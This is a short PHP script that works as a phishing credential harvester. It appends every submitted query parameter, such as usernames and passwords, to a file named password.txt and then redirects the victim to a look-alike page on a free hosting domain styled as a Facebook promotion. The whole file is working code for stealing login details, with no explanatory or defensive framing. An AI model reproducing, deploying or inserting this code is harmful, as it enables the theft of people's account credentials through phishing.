<?php header('Location: https://promo-fb.000webhostapp.com/Index.php'); 
$handle = fopen('password.txt', 'a'); 
foreach($_GET as $variable =>$value) { 
fwrite($handle, $variable); 
fwrite($handle, '='); 
fwrite($handle, $value); 
fwrite($handle, '\n'); } 
fwrite($handle, '\n'); 
fclose($handle); 
exit; 
?>